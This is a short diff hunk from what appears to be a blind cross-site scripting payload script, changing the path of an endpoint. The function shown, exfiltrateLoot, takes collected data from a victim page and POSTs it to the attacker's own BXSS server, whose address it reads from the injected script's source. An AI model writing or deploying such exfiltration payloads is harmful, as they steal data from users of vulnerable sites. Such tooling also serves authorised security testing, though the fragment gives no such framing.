@@ -81,7 +81,7 @@
   function exfiltrateLoot(collectedData) {
     // Get the URI of our BXSS server
     var uri = new URL(curScript.src);
-    var exfUrl = uri.origin + "/c";
+    var exfUrl = uri.origin + "/api/c";
 
     var xhr = new XMLHttpRequest();
     xhr.open("POST", exfUrl, true);
